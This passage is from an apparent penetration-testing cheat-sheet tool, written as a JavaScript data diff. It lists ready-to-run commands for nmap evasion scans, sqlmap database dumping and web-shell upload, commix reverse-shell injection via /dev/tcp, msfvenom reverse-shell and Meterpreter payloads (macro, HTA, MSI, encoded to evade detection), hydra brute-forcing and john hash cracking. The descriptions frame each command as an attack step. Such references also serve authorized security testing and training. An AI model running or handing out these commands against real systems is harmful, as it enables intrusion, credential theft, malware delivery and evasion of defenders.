+{t:'Firewall Evasion Fragmentation',c:'nmap -sS -f --mtu 8 -T2 $T',d:'Fragments packets into tiny 8-byte chunks to evade firewalls and IDS that cannot reassemble fragmented traffic. The slow T2 timing further reduces detection probability.'},
+{t:'Decoy Scan',c:'nmap -sS -D RND:10 -T4 $T',d:'Generates 10 random decoy IP addresses that appear to scan alongside your real IP. Makes it extremely difficult for the target to identify which source is the actual attacker.'},
+{t:'Idle Zombie Scan',c:'nmap -sI zombie_host $T -p 80,443',d:'Uses a zombie host to scan the target without sending any packets from your IP. The most stealthy scan type available, completely hiding your identity from the target.'},
+{t:'Source Port Manipulation',c:'nmap -sS --source-port 53 -T4 $T',d:'Sends scan packets from port 53 (DNS). Many firewalls allow traffic from port 53 because DNS needs to work, potentially bypassing port-based firewall rules.'},
+{t:'No Ping Discovery Only',c:'nmap -Pn -sS -T4 $T',d:'Skips host discovery and assumes the target is alive. Essential when ICMP ping is blocked by the firewall, which would cause nmap to skip the host entirely.'},
+{t:'Ping Sweep Subnet',c:'nmap -sn $T/24 -oG alive.gnmap',d:'Discovers live hosts in a /24 subnet without port scanning. Sends ICMP echo, TCP SYN to 443, TCP ACK to 80, and ICMP timestamp to maximize host discovery.'},
+{t:'ARP Discovery LAN',c:'nmap -PR -sn $T/24',d:'Uses ARP requests to discover hosts on the local network. ARP discovery is the most reliable method on LANs because it operates at Layer 2 and cannot be firewalled.'},
+{t:'SMB Enumeration Scripts',c:'nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 $T',d:'Enumerates SMB shares, users, and OS information. Reveals accessible file shares, valid usernames for brute forcing, and the exact Windows version for exploit selection.'},
+{t:'HTTP Enumeration',c:'nmap --script http-enum,http-headers,http-methods -p 80,443,8080 $T',d:'Discovers web directories, grabs HTTP headers, and tests allowed HTTP methods. The http-enum script uses a built-in database of common paths to find hidden content.'},
+{t:'DNS Enumeration',c:'nmap --script dns-brute,dns-zone-transfer -p 53 $T',d:'Attempts DNS zone transfers and brute forces subdomains. A successful zone transfer dumps the entire DNS database, revealing all hosts in the domain.'},
+{t:'SSL/TLS Audit',c:'nmap --script ssl-enum-ciphers,ssl-heartbleed,ssl-poodle -p 443 $T',d:'Enumerates supported cipher suites and checks for Heartbleed and POODLE vulnerabilities. Identifies weak encryption configurations that could be exploited.'},
+{t:'FTP Bounce and Anonymous',c:'nmap --script ftp-anon,ftp-bounce,ftp-vsftpd-backdoor -p 21 $T',d:'Checks for anonymous FTP access, FTP bounce attack capability, and the vsftpd 2.3.4 backdoor. Anonymous FTP often exposes sensitive files and credentials.'},
+{t:'SNMP Enumeration',c:'nmap --script snmp-brute,snmp-info,snmp-interfaces -p 161 -sU $T',d:'Brute forces SNMP community strings and extracts system information and network interfaces. SNMP with default community strings is one of the most common misconfigurations.'},
+{t:'MySQL Enumeration',c:'nmap --script mysql-info,mysql-enum,mysql-databases -p 3306 $T',d:'Gathers MySQL server information, enumerates users, and lists accessible databases. Exposed MySQL services are high-value targets for data exfiltration.'},
+{t:'Timing Template T0 Paranoid',c:'nmap -sS -T0 -p 80,443 $T',d:'Uses the slowest possible timing template with 5-minute delays between probes. Designed for extreme stealth when you cannot afford to trigger any detection systems.'},
+{t:'XML Output for Parsing',c:'nmap -sV -sC -p- $T -oX scan.xml',d:'Saves results in XML format which can be imported into tools like Metasploit, Nessus, or parsed with custom scripts. The most structured and detailed output format.'},
+{t:'Grepable Output',c:'nmap -sV -p- $T -oG scan.gnmap',d:'Saves results in a grep-friendly format with one host per line. Easy to parse with grep, awk, and cut for quick extraction of specific ports or services.'},
+{t:'NSE Script Arguments',c:'nmap --script http-brute --script-args http-brute.path=/admin -p 80 $T',d:'Runs the HTTP brute force script with custom arguments targeting the /admin path. Script arguments let you customize NSE script behavior for specific targets.'},
+]},
+Naabu:{cat:'Scanning',cmds:[
+{t:'Full Port Lightning Scan',c:'naabu -host $T -p - -rate 5000',d:'Scans all 65535 ports at 5000 packets per second using raw SYN packets. Naabu is purpose-built for speed and can complete a full port scan in seconds.'},
+{t:'Top 1000 Ports',c:'naabu -host $T -top-ports 1000',d:'Scans the 1000 most commonly used ports based on nmap service frequency data. A fast initial scan that covers the vast majority of real-world services.'},
+{t:'SYN Stealth Scan',c:'naabu -host $T -s s -p - -rate 3000',d:'Explicitly uses SYN scan mode which sends half-open connections. The connection is never completed, making it harder for application-level logging to detect the scan.'},
+{t:'Custom Port Selection',c:'naabu -host $T -p 21,22,25,53,80,110,139,143,443,445,993,995,3306,3389,5432,8080,8443',d:'Scans a curated list of high-value ports covering common services like SSH, HTTP, SMB, databases, and mail. Faster than a full scan when you know what to look for.'},
+{t:'Pipe from Subfinder',c:'subfinder -d $T -silent | naabu -p 80,443,8080,8443 -silent',d:'Chains subdomain discovery directly into port scanning. Every discovered subdomain is immediately checked for open web ports, building a complete target list in one pipeline.'},
+{t:'JSON Output',c:'naabu -host $T -p - -json -o ports.json',d:'Outputs results in JSON format with host, port, and protocol information. Ideal for programmatic processing and integration with custom automation workflows.'},
+{t:'Verify Open Ports',c:'naabu -host $T -verify -p -',d:'Performs a second verification pass on discovered open ports using TCP connect. Eliminates false positives from SYN scans caused by firewalls sending RST packets.'},
+{t:'List File Input',c:'naabu -list hosts.txt -p 80,443 -o open_ports.txt',d:'Reads multiple targets from a file and scans specific ports on all of them. Efficient for scanning an entire network inventory for web services.'},
+{t:'Exclude Ports',c:'naabu -host $T -p - -exclude-ports 25,587,993',d:'Scans all ports except the specified ones. Useful when certain ports trigger alerts or are known to cause issues with the scanning infrastructure.'},
+{t:'Chain with Nmap',c:'naabu -host $T -p - -nmap-cli "nmap -sV -sC"',d:'Uses naabu for fast port discovery then automatically hands open ports to nmap for detailed service detection and script scanning. Best of both tools in one command.'},
+{t:'CONNECT Scan Mode',c:'naabu -host $T -s connect -p - -rate 2000',d:'Uses full TCP connect instead of SYN packets. Does not require root privileges and works reliably through proxies and VPNs that may interfere with raw packets.'},
+{t:'CDP Scan',c:'naabu -host $T -p - -scan-type c',d:'Uses the connect scan type which completes the full TCP handshake. More reliable than SYN scanning but slower and more easily detected by the target.'},
+{t:'Silent CSV Output',c:'naabu -host $T -p - -silent -csv -o ports.csv',d:'Outputs results in CSV format with no banner text. Perfect for importing into spreadsheets or databases for reporting and tracking open ports over time.'},
+{t:'Interface Selection',c:'naabu -host $T -p - -interface eth0 -rate 5000',d:'Forces scanning through a specific network interface. Essential when your machine has multiple interfaces connected to different networks or VPN tunnels.'},
+{t:'Warm Up Period',c:'naabu -host $T -p - -warm-up-time 5 -rate 3000',d:'Adds a 5-second warm-up period before reaching full scan speed. Gradually increases the packet rate to avoid triggering burst-detection mechanisms on firewalls.'},
+]},
+Nuclei:{cat:'Scanning',cmds:[
+{t:'Automatic Template Selection',c:'nuclei -u https://$T -as',d:'Automatically selects relevant templates based on the technologies detected on the target. Wappalyzer-powered detection ensures only applicable checks are run.'},
+{t:'Full Template Library',c:'nuclei -u https://$T -t nuclei-templates/ -rl 150',d:'Runs every template in the nuclei-templates repository at 150 requests per second. This is the most comprehensive scan but can take a long time on large targets.'},
+{t:'Critical and High Severity',c:'nuclei -u https://$T -severity critical,high',d:'Only runs templates marked as critical or high severity. Focuses on the most impactful vulnerabilities and skips informational or low-risk checks.'},
+{t:'CVE Detection Templates',c:'nuclei -u https://$T -t nuclei-templates/http/cves/ -rl 100',d:'Tests for known CVEs using dedicated detection templates. Each template is designed to safely identify a specific vulnerability without causing damage.'},
+{t:'Bulk URL Scanning',c:'nuclei -l urls.txt -severity medium,high,critical -o findings.txt',d:'Scans a list of URLs from a file for medium-to-critical vulnerabilities. Ideal for testing multiple targets from subdomain enumeration or web crawling results.'},
+{t:'Headless Browser Templates',c:'nuclei -u https://$T -headless -t nuclei-templates/headless/',d:'Uses a headless Chrome browser to run templates that require JavaScript rendering. Catches vulnerabilities in modern single-page applications that static scanning misses.'},
+{t:'Workflow Chained Scan',c:'nuclei -u https://$T -w nuclei-templates/workflows/',d:'Runs workflow templates that chain multiple checks together. A workflow might first detect WordPress, then run all WordPress-specific vulnerability checks automatically.'},
+{t:'New Templates Only',c:'nuclei -u https://$T -nt -severity high,critical',d:'Only runs templates added since the last update. Quickly checks targets against the latest discovered vulnerabilities without re-running the entire template library.'},
+{t:'JSON Report',c:'nuclei -u https://$T -json -o nuclei_report.json',d:'Outputs detailed findings in JSON format including template metadata, matched evidence, and severity ratings. Essential for integration with reporting tools and dashboards.'},
+{t:'Tag Based Filtering',c:'nuclei -u https://$T -tags rce,sqli,xss,ssrf,lfi -rl 100',d:'Runs only templates tagged with specific vulnerability classes. Lets you focus on particular attack vectors like remote code execution or SQL injection.'},
+{t:'Exclude Tags',c:'nuclei -u https://$T -etags dos,fuzz -severity high,critical',d:'Excludes templates tagged as denial-of-service or fuzzing to prevent disruptive tests. Important in production environments where availability must be maintained.'},
+{t:'Custom Header Auth',c:'nuclei -u https://$T -H "Authorization: Bearer tok123" -as',d:'Adds an authentication header to all requests. Allows scanning of authenticated endpoints that would otherwise return 401 or 403 responses.'},
+{t:'Proxy Routing',c:'nuclei -u https://$T -proxy http://127.0.0.1:8080 -as',d:'Routes all nuclei traffic through a proxy for inspection. Useful for debugging template matches and verifying that findings are genuine, not false positives.'},
+{t:'Rate and Concurrency Control',c:'nuclei -u https://$T -rl 50 -c 10 -bs 25',d:'Sets the rate limit to 50 requests per second with 10 concurrent templates and batch size of 25. Fine-tune these values to balance speed and target stability.'},
+{t:'Custom Template Directory',c:'nuclei -u https://$T -t /path/to/custom-templates/ -severity high',d:'Points nuclei to your own custom template directory. Use this to run proprietary checks, organization-specific tests, or templates you have developed yourself.'},
+{t:'Interactsh Callback',c:'nuclei -u https://$T -iserver https://oast.me -as',d:'Uses an Interactsh server for out-of-band detection of blind vulnerabilities. Catches blind SSRF, blind XSS, and other issues where the response does not directly reveal the bug.'},
+{t:'Markdown Report',c:'nuclei -u https://$T -me report_dir -as',d:'Generates a markdown report with all findings organized by severity. Creates a professional, readable report suitable for sharing with clients or team members.'},
+{t:'Retries and Timeout',c:'nuclei -u https://$T -retries 3 -timeout 10 -as',d:'Retries failed requests up to 3 times with a 10-second timeout. Improves reliability when scanning targets with intermittent connectivity or slow response times.'},
+{t:'Protocol Templates',c:'nuclei -u $T -t nuclei-templates/network/ -severity high',d:'Runs network-level protocol templates that test non-HTTP services like DNS, FTP, and SSH. Extends nuclei beyond web scanning to cover the full network attack surface.'},
+]},
+Sqlmap:{cat:'Exploit',cmds:[
+{t:'GET Parameter Detection',c:'sqlmap -u "https://$T/page?id=1" --batch --dbs',d:'Tests the id parameter for SQL injection and dumps all database names if vulnerable. The --batch flag accepts all default prompts automatically for unattended scanning.'},
+{t:'POST Form Injection',c:'sqlmap -u "https://$T/login" --data "user=admin&pass=test" --batch --dbs',d:'Tests POST form parameters for SQL injection. This targets login forms and other POST-based inputs where injection vulnerabilities commonly exist.'},
+{t:'Cookie Based Injection',c:'sqlmap -u "https://$T/dashboard" --cookie "id=1*" --batch --dbs',d:'Tests the cookie value marked with an asterisk for injection. The * tells sqlmap exactly where to inject, targeting cookie-based vulnerabilities that scanners often miss.'},
+{t:'Dump Entire Database',c:'sqlmap -u "https://$T/page?id=1" -D targetdb --dump --batch',d:'Dumps all tables and data from a specific database. Replace targetdb with the actual database name discovered from the --dbs enumeration step.'},
+{t:'Dump Specific Table',c:'sqlmap -u "https://$T/page?id=1" -D targetdb -T users --dump --batch',d:'Extracts all rows from the users table in the specified database. More targeted than dumping everything, focusing on the most valuable data like credentials.'},
+{t:'OS Shell Access',c:'sqlmap -u "https://$T/page?id=1" --os-shell --batch',d:'Attempts to upload a web shell and spawn an interactive OS command shell through the SQL injection. This escalates from database access to full server compromise.'},
+{t:'SQL Shell Interactive',c:'sqlmap -u "https://$T/page?id=1" --sql-shell --batch',d:'Opens an interactive SQL prompt where you can execute arbitrary SQL queries. Useful for manual exploration of the database beyond automated dumping.'},
+{t:'File Read from Server',c:'sqlmap -u "https://$T/page?id=1" --file-read="/etc/passwd" --batch',d:'Reads a file from the server filesystem through the SQL injection. Uses database functions like LOAD_FILE() to access files the database user can read.'},
+{t:'File Write to Server',c:'sqlmap -u "https://$T/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch',d:'Writes a local file to the remote server through the SQL injection. Typically used to upload a web shell for persistent access to the compromised server.'},
+{t:'WAF Bypass Tamper Chain',c:'sqlmap -u "https://$T/page?id=1" --tamper=space2comment,between,randomcase --random-agent --batch',d:'Chains multiple tamper scripts to modify payloads and evade WAF detection. space2comment replaces spaces with comments, between uses BETWEEN instead of comparisons, and randomcase varies letter casing.'},
+{t:'All Techniques Max Level',c:'sqlmap -u "https://$T/page?id=1" --technique=BEUSTQ --level 5 --risk 3 --batch',d:'Tests all injection techniques (Boolean, Error, Union, Stacked, Time, Inline) at maximum detection level and risk. The most thorough but also the noisiest and slowest scan.'},
+{t:'Request File Injection',c:'sqlmap -r request.txt --batch --dbs --level 3',d:'Reads a saved HTTP request file (from Burp Suite or browser tools) and tests all parameters. Preserves exact headers, cookies, and request format from the original request.'},
+{t:'Tor Anonymized Scan',c:'sqlmap -u "https://$T/page?id=1" --tor --tor-type=SOCKS5 --check-tor --batch',d:'Routes all traffic through the Tor network for anonymity. The check-tor flag verifies the Tor connection is working before starting the injection tests.'},
+{t:'Proxy Through Burp',c:'sqlmap -u "https://$T/page?id=1" --proxy http://127.0.0.1:8080 --batch',d:'Sends all traffic through a proxy for inspection and logging. Lets you see exactly what payloads sqlmap is sending and how the server responds.'},
+{t:'Time Based Blind',c:'sqlmap -u "https://$T/page?id=1" --technique=T --time-sec 5 --batch',d:'Forces time-based blind injection only, with 5-second sleep delays. Used when the application shows no visible difference in responses, relying on response timing instead.'},
+{t:'Boolean Based Blind',c:'sqlmap -u "https://$T/page?id=1" --technique=B --batch --dbs',d:'Uses only boolean-based blind injection, inferring data from true/false response differences. Slower than union-based but works when error messages and unions are filtered.'},
+{t:'Custom Injection Point',c:'sqlmap -u "https://$T/page" --data "id=1*&action=view" --batch --dbs',d:'Marks the exact injection point with an asterisk in POST data. Tells sqlmap to only test that specific position instead of trying all parameters.'},
+{t:'Enumerate Users and Passwords',c:'sqlmap -u "https://$T/page?id=1" --users --passwords --batch',d:'Extracts database user accounts and their password hashes. The hashes can then be cracked offline with hashcat or john to obtain plaintext credentials.'},
+{t:'Enumerate Privileges',c:'sqlmap -u "https://$T/page?id=1" --privileges --batch',d:'Lists the privileges granted to each database user. Determines whether the current user has admin rights, file read/write access, or other elevated permissions.'},
+{t:'Crawl and Scan',c:'sqlmap -u "https://$T" --crawl=3 --batch --dbs',d:'Crawls the website up to 3 levels deep and tests every discovered form and parameter for SQL injection. An automated approach that finds injection points you might manually miss.'},
+]},
+Commix:{cat:'Exploit',cmds:[
+{t:'Basic Command Injection Test',c:'commix -u "https://$T/page?cmd=test" --batch',d:'Tests the cmd parameter for OS command injection vulnerabilities. Commix tries multiple injection techniques including classic, eval-based, and time-based methods.'},
+{t:'POST Data Injection',c:'commix -u "https://$T/exec" --data "ip=$T" --batch',d:'Tests POST parameters for command injection. Applications that take user input for system commands like ping or traceroute are common injection targets.'},
+{t:'Cookie Based Injection',c:'commix -u "https://$T/panel" --cookie "input=test" --batch',d:'Tests cookie values for command injection. Less commonly tested than GET/POST parameters, making cookie-based injection a frequently overlooked vulnerability.'},
+{t:'All Techniques Level 3',c:'commix -u "https://$T/page?cmd=test" --level 3 --batch',d:'Uses the highest detection level which tests all injection techniques with more payloads. Increases detection coverage at the cost of more requests and scan time.'},
+{t:'Execute Specific OS Command',c:'commix -u "https://$T/page?cmd=test" --os-cmd="id;whoami;uname -a" --batch',d:'Executes specific OS commands through the injection point. Chains multiple commands with semicolons to gather system information in a single request.'},
+{t:'Reverse Shell Injection',c:'commix -u "https://$T/page?cmd=test" --os-cmd="bash -c \'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\'"',d:'Injects a bash reverse shell payload through the command injection point. Replace LHOST and LPORT with your listener address to receive the incoming shell connection.'},
+{t:'File Write Exploitation',c:'commix -u "https://$T/page?file=test" --file-write="/tmp/shell.php" --file-dest="/var/www/html/"',d:'Writes a file to the web root through the command injection. Used to deploy a web shell that provides persistent access even after the injection vulnerability is patched.'},
+{t:'Proxy Through Burp',c:'commix -u "https://$T/page?cmd=test" --proxy http://127.0.0.1:8080 --batch',d:'Routes all traffic through a proxy to inspect payloads and responses. Helps understand which injection technique succeeded and how the application processes the input.'},
+{t:'Custom Header Injection',c:'commix -u "https://$T/page?cmd=test" -H "Authorization: Bearer tok" --batch',d:'Adds custom headers to bypass authentication or access controls. Some injection points are only accessible behind authentication that requires specific header tokens.'},
+{t:'Shellshock Exploitation',c:'commix -u "https://$T/cgi-bin/test.cgi" --shellshock --batch',d:'Tests CGI scripts for the Shellshock vulnerability (CVE-2014-6271). Sends specially crafted User-Agent headers that exploit bash parsing errors to execute arbitrary commands.'},
+{t:'Time Based Technique',c:'commix -u "https://$T/page?cmd=test" -t time --batch',d:'Forces time-based injection detection only. Uses sleep-based payloads and measures response delays to confirm injection when no output is reflected in the response.'},
+{t:'File Based Technique',c:'commix -u "https://$T/page?cmd=test" -t file --batch',d:'Uses file-based injection that writes output to a file and reads it back. Works when command output is not displayed but the web server can serve files from a writable directory.'},
+{t:'Verbose Results Based',c:'commix -u "https://$T/page?cmd=test" -t results --batch -v',d:'Uses results-based detection with verbose output showing every payload attempted. The most straightforward technique where command output is directly reflected in the response.'},
+{t:'Custom Suffix and Prefix',c:'commix -u "https://$T/page?cmd=test" --prefix=";" --suffix="|" --batch',d:'Adds custom characters before and after the injection payload. Necessary when the vulnerable parameter is embedded in a larger command and needs specific delimiters to break out.'},
+{t:'Tor Anonymized',c:'commix -u "https://$T/page?cmd=test" --tor --batch',d:'Routes exploitation traffic through the Tor network to hide your source IP. Important during authorized red team engagements where testing attribution controls is in scope.'},
+]},
+Msfvenom:{cat:'Exploit',cmds:[
+{t:'Linux x64 Reverse Shell ELF',c:'msfvenom -p linux/x64/shell_reverse_tcp LHOST=$T LPORT=4444 -f elf -o shell.elf',d:'Generates a 64-bit Linux ELF binary that connects back to your listener with a /bin/sh shell. Upload and execute on the target after gaining initial access for interactive control.'},
+{t:'Linux x64 Meterpreter ELF',c:'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$T LPORT=4444 -f elf -o meterp.elf',d:'Creates a staged Meterpreter payload for Linux x64. Meterpreter provides advanced features like file upload/download, pivoting, and privilege escalation modules.'},
+{t:'Linux x86 Reverse Shell',c:'msfvenom -p linux/x86/shell_reverse_tcp LHOST=$T LPORT=4444 -f elf -o shell32.elf',d:'Generates a 32-bit Linux reverse shell for older systems or 32-bit installations. Use this when the target is running a 32-bit OS or you encounter compatibility issues.'},
+{t:'Windows x64 Reverse Shell EXE',c:'msfvenom -p windows/x64/shell_reverse_tcp LHOST=$T LPORT=4444 -f exe -o shell.exe',d:'Creates a 64-bit Windows executable that provides a cmd.exe reverse shell. The simplest Windows payload with no dependencies on the Metasploit framework.'},
+{t:'Windows x64 Meterpreter EXE',c:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$T LPORT=4444 -f exe -o meterp.exe',d:'Generates a staged x64 Meterpreter payload requiring a multi/handler listener. The staged approach sends a small initial payload that downloads the full Meterpreter from your listener.'},
+{t:'Windows x86 Meterpreter',c:'msfvenom -p windows/meterpreter/reverse_tcp LHOST=$T LPORT=4444 -f exe -o meterp32.exe',d:'Creates a 32-bit Meterpreter payload that works on both 32-bit and 64-bit Windows through WoW64 compatibility. The most broadly compatible Windows payload.'},
+{t:'PHP Reverse Shell',c:'msfvenom -p php/reverse_php LHOST=$T LPORT=4444 -f raw -o shell.php',d:'Generates a PHP reverse shell script for uploading to web servers. Works on any server running PHP, which is the most common server-side language on the web.'},
+{t:'PHP Meterpreter',c:'msfvenom -p php/meterpreter/reverse_tcp LHOST=$T LPORT=4444 -f raw -o meterp.php',d:'Creates a PHP Meterpreter payload that provides advanced post-exploitation features through a web shell. Requires a Metasploit handler to receive the connection.'},
+{t:'Python Reverse Shell',c:'msfvenom -p cmd/unix/reverse_python LHOST=$T LPORT=4444 -f raw',d:'Outputs a Python one-liner that creates a reverse shell. Can be pasted directly into a command injection vulnerability on systems with Python installed.'},
+{t:'Bash Reverse Shell',c:'msfvenom -p cmd/unix/reverse_bash LHOST=$T LPORT=4444 -f raw',d:'Generates a bash reverse shell one-liner. The simplest payload for Linux systems that relies only on bash, which is available on virtually every Linux installation.'},
+{t:'ASP Reverse Shell',c:'msfvenom -p windows/shell_reverse_tcp LHOST=$T LPORT=4444 -f asp -o shell.asp',d:'Creates a classic ASP web shell for IIS servers. Upload through any file upload vulnerability on Windows servers running legacy ASP applications.'},
+{t:'ASPX Meterpreter',c:'msfvenom -p windows/meterpreter/reverse_tcp LHOST=$T LPORT=4444 -f aspx -o shell.aspx',d:'Generates an ASPX Meterpreter shell for modern IIS/.NET servers. ASPX is the standard for modern Windows web applications and is more likely to be allowed than ASP.'},
+{t:'JSP Reverse Shell',c:'msfvenom -p java/jsp_shell_reverse_tcp LHOST=$T LPORT=4444 -f raw -o shell.jsp',d:'Creates a JSP reverse shell for Java application servers like Tomcat, JBoss, and WebLogic. Upload through manager interfaces or file upload vulnerabilities.'},
+{t:'WAR Reverse Shell',c:'msfvenom -p java/jsp_shell_reverse_tcp LHOST=$T LPORT=4444 -f war -o shell.war',d:'Packages the JSP shell in a WAR file for deployment through Tomcat manager or similar interfaces. WAR deployment is a standard method for deploying Java web applications.'},
+{t:'DLL Injection Payload',c:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$T LPORT=4444 -f dll -o inject.dll',d:'Generates a malicious DLL for use in DLL injection or DLL side-loading attacks. When loaded by a process, it establishes a Meterpreter reverse connection.'},
+{t:'Shellcode C Format',c:'msfvenom -p windows/x64/shell_reverse_tcp LHOST=$T LPORT=4444 -f c',d:'Outputs raw shellcode as a C-style byte array. Use this to embed the payload in custom C programs, exploit development, or manual shellcode injection.'},
+{t:'Shellcode Python Format',c:'msfvenom -p windows/x64/shell_reverse_tcp LHOST=$T LPORT=4444 -f python',d:'Outputs shellcode formatted as a Python byte string. Useful for exploit development in Python or injecting shellcode through Python-based attack scripts.'},
+{t:'Shellcode CSharp',c:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$T LPORT=4444 -f csharp',d:'Generates shellcode as a C# byte array for embedding in .NET applications. Commonly used in red team tools and custom loaders built with C#.'},
+{t:'Encoded x64 XOR Dynamic',c:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$T LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o enc.exe',d:'Encodes the payload with 5 iterations of XOR dynamic encoding. Each iteration wraps the payload in another encoding layer, making signature-based detection harder.'},
+{t:'Encoded Shikata Ga Nai',c:'msfvenom -p windows/meterpreter/reverse_tcp LHOST=$T LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o sgn.exe',d:'Uses the polymorphic Shikata Ga Nai encoder with 10 iterations. This is the most well-known payload encoder that generates unique output each time it runs.'},
+{t:'MSI Installer Payload',c:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$T LPORT=4444 -f msi -o payload.msi',d:'Packages the payload as a Windows Installer MSI file. MSI files can sometimes bypass application whitelisting since Windows Installer is a trusted system process.'},
+{t:'HTA Payload',c:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$T LPORT=4444 -f hta-psh -o payload.hta',d:'Creates an HTML Application that runs PowerShell to execute the payload. HTA files run with full trust in Internet Explorer and can be delivered via phishing.'},
+{t:'PowerShell One-Liner',c:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$T LPORT=4444 -f psh -o payload.ps1',d:'Generates a PowerShell script that executes the payload in memory. PowerShell payloads are fileless, running entirely in memory without writing to disk.'},
+{t:'VBA Macro Payload',c:'msfvenom -p windows/meterpreter/reverse_tcp LHOST=$T LPORT=4444 -f vba',d:'Outputs VBA macro code for embedding in Office documents. When the victim opens the document and enables macros, the payload executes and connects back to your listener.'},
+]},
+Hydra:{cat:'Brute',cmds:[
+{t:'SSH Password Brute Force',c:'hydra -l admin -P $WL ssh://$T -t 4 -V',d:'Brute forces SSH login with username admin and passwords from the wordlist. Limited to 4 threads because SSH servers commonly limit concurrent connections and ban aggressive scanners.'},
+{t:'SSH User and Pass Lists',c:'hydra -L users.txt -P $WL ssh://$T -t 4',d:'Tests every combination of usernames and passwords from two separate files. Use this when you have a list of potential usernames gathered from OSINT or enumeration.'},
+{t:'SSH Custom Port',c:'hydra -l admin -P $WL ssh://$T:2222 -t 4',d:'Targets SSH running on a non-standard port. Administrators often move SSH to alternate ports for security through obscurity, but it is still vulnerable to brute force.'},
+{t:'FTP Brute Force',c:'hydra -l admin -P $WL ftp://$T -t 8',d:'Attacks FTP login with 8 parallel threads. FTP is generally more tolerant of concurrent connections than SSH, allowing faster brute force speeds.'},
+{t:'FTP Anonymous Check',c:'hydra -l anonymous -P $WL ftp://$T',d:'Tests for anonymous FTP access which allows login without a real password. Anonymous FTP is a common misconfiguration that can expose sensitive files and directories.'},
+{t:'HTTP POST Form Login',c:'hydra -l admin -P $WL $T http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"',d:'Attacks a web login form by sending POST requests. The ^USER^ and ^PASS^ placeholders are replaced with credentials, and "F=Invalid" defines the failure indicator in the response.'},
+{t:'HTTP POST Form Custom Fail',c:'hydra -l admin -P $WL $T http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect:H=Cookie: session=abc"',d:'Includes a custom cookie header and uses "incorrect" as the failure string. Customize the form field names, failure message, and headers to match the exact target login page.'},
+{t:'HTTP GET Basic Auth',c:'hydra -l admin -P $WL $T http-get /admin',d:'Attacks HTTP Basic Authentication on the /admin path. Basic Auth sends credentials in Base64 and is commonly used to protect admin panels and legacy applications.'},
+{t:'HTTP GET Digest Auth',c:'hydra -l admin -P $WL $T http-get /secure',d:'Attacks HTTP Digest Authentication which is more secure than Basic Auth but still vulnerable to brute force. Uses challenge-response instead of sending passwords directly.'},
+{t:'HTTPS POST Form',c:'hydra -l admin -P $WL $T https-post-form "/login:user=^USER^&pass=^PASS^:F=failed"',d:'Attacks a login form over HTTPS. The https-post-form module handles TLS encryption automatically. Ensure the failure string exactly matches what the login page returns.'},
+{t:'RDP Brute Force',c:'hydra -l administrator -P $WL rdp://$T -t 1',d:'Brute forces Remote Desktop Protocol with a single thread. RDP is extremely slow to respond and rate-limited by Windows, so parallel connections often cause lockouts.'},
+{t:'MySQL Root Brute',c:'hydra -l root -P $WL $T mysql',d:'Attacks the MySQL root account. Externally exposed MySQL servers with weak root passwords are a critical finding that provides direct database access.'},
+{t:'PostgreSQL Brute',c:'hydra -l postgres -P $WL $T postgres',d:'Brute forces the default PostgreSQL superuser account. PostgreSQL access allows reading all databases and potentially executing OS commands through server functions.'},
+{t:'SMB Brute Force',c:'hydra -l admin -P $WL $T smb',d:'Attacks Windows SMB/CIFS authentication. Successful SMB credentials can provide file share access and potentially enable remote command execution through tools like psexec.'},
+{t:'SMTP Brute Force',c:'hydra -l admin -P $WL $T smtp -s 587',d:'Attacks SMTP authentication on the submission port. Compromised email credentials allow sending phishing emails from a legitimate account within the organization.'},
+{t:'IMAP Brute Force',c:'hydra -l admin -P $WL $T imap -s 993 -S',d:'Attacks IMAP email access over SSL on port 993. The -S flag enables SSL/TLS encryption. Successful login provides access to the mailbox contents.'},
+{t:'POP3 Brute Force',c:'hydra -l admin -P $WL $T pop3 -s 995 -S',d:'Attacks POP3 email access over SSL. POP3 is an older email protocol but still widely used. Compromised accounts may contain sensitive emails and attachments.'},
+{t:'Telnet Brute Force',c:'hydra -l admin -P $WL $T telnet',d:'Attacks Telnet login which transmits credentials in cleartext. Telnet is commonly found on legacy systems, network devices, and IoT equipment.'},
+{t:'SNMP Community Brute',c:'hydra -P $WL $T snmp',d:'Brute forces SNMP community strings. Default or weak community strings provide access to device configuration, network topology, and sometimes allow remote reconfiguration.'},
+{t:'VNC Brute Force',c:'hydra -P $WL $T vnc',d:'Attacks VNC remote desktop which often uses password-only authentication without a username. Many VNC installations use weak or default passwords.'},
+{t:'LDAP Brute Force',c:'hydra -l admin -P $WL $T ldap2 -s 389',d:'Attacks LDAP directory authentication. Compromised LDAP credentials often provide access to the entire directory structure including user accounts and group memberships.'},
+{t:'MSSQL SA Brute',c:'hydra -l sa -P $WL $T mssql',d:'Attacks the MSSQL system administrator account. SA access to MSSQL allows enabling xp_cmdshell for OS command execution and accessing all databases.'},
+{t:'Redis Brute Force',c:'hydra -P $WL $T redis',d:'Attacks Redis authentication which uses a single password without a username. Unauthenticated or weakly protected Redis instances can be exploited for remote code execution.'},
+{t:'Output to File',c:'hydra -l admin -P $WL ssh://$T -V -o hydra_results.txt',d:'Saves successful credentials to a file with verbose output showing every attempt. The -V flag displays each login try in real-time for monitoring progress.'},
+{t:'Resume Previous Attack',c:'hydra -R',d:'Resumes a previously interrupted hydra session from where it stopped. Hydra automatically saves session state, so you can resume after network issues or interruptions.'},
+]},
+John:{cat:'Crack',cmds:[
+{t:'Shadow File Crack',c:'john --wordlist=$WL /etc/shadow',d:'Cracks password hashes from a Linux shadow file using wordlist mode. John automatically detects the hash format (SHA-512, bcrypt, etc.) used in the shadow file.'},
+{t:'Raw MD5 Hash',c:'john --format=raw-md5 --wordlist=$WL hashes.txt',d:'Cracks unsalted MD5 hashes which are extremely fast to crack. MD5 is a weak hash used by many legacy applications and databases.'},
